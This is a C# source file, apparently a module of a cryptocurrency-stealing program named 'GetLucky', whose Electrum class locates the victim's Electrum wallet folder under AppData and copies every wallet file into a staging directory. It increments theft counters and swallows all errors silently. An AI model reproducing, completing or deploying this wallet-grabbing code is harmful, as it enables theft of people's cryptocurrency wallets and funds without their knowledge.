using System.IO;

namespace GetLucky
{
    class Electrum
    {
        public static int count = 0;
        public static string ElectrumDir = "\\Wallets\\Electrum\\";
        public static string ElectrumDir2 = Help.AppDate + "\\Electrum\\wallets";

        public static void EleStr(string directorypath) 
        {
            try
            {
                if (Directory.Exists(ElectrumDir2))
                {
                    foreach (FileInfo file in new DirectoryInfo(ElectrumDir2).GetFiles())
                    {
                        Directory.CreateDirectory(directorypath + ElectrumDir);
                        file.CopyTo(directorypath + ElectrumDir + file.Name);
                    }
                    count++;
                    Wallets.count++;
                }
                else
                {
                    return;
                }



            }
            catch {}
        }
    }
}
